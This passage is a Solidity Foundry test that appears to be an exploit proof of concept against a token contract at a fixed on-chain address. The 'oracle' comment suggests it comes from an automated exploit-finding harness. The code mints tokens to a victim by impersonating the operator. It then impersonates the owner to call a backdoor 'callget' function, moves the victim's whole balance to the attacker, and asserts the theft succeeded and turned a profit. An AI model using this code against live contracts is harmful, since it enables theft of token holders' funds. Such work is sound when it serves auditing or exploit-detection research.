}

interface IMyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function callget(address _from, address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract MyBond {
    function owner() external view returns (address) {}
    function operator() external view returns (address) {}
    function mint(address recipient_, uint256 amount_) external returns (bool) {}
    function callget(address _from, address _to, uint256 _amount) external {}
    function balanceOf(address account) external view returns (uint256) {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address private owner;
    address private victim = address(0x123);
    uint256 private initialAttackerBalance;
    uint256 private initialVictimBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to find the owner of the contract
        owner = MyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // We need a victim with BOND tokens - let's create one
        victim = address(0x123);
        vm.label(victim, "Victim");

        // Give victim some BOND tokens
        // First, we need to mint tokens to victim since we need tokens to steal
        // We can do this by impersonating the operator (who can mint)
        address operator = MyBond(TARGET).operator();
        vm.prank(operator);
        MyBond(TARGET).mint(victim, 1000 * 1e18);

        // Store initial balances for verification
        initialAttackerBalance = MyBond(TARGET).balanceOf(attacker);
        initialVictimBalance = MyBond(TARGET).balanceOf(victim);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        // Impersonate the owner to call the backdoor function
        vm.prank(owner);

        // Steal all tokens from victim to attacker
        uint256 stealAmount = MyBond(TARGET).balanceOf(victim);
        MyBond(TARGET).callget(victim, attacker, stealAmount);

        // Verify the exploit worked
        uint256 finalAttackerBalance = MyBond(TARGET).balanceOf(attacker);
        uint256 finalVictimBalance = MyBond(TARGET).balanceOf(victim);

        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Initial victim balance:", initialVictimBalance);
        console.log("Final victim balance:", finalVictimBalance);

        // The oracle will check that attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
        assertEq(finalVictimBalance, 0, "Victim should have 0 tokens after theft");
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

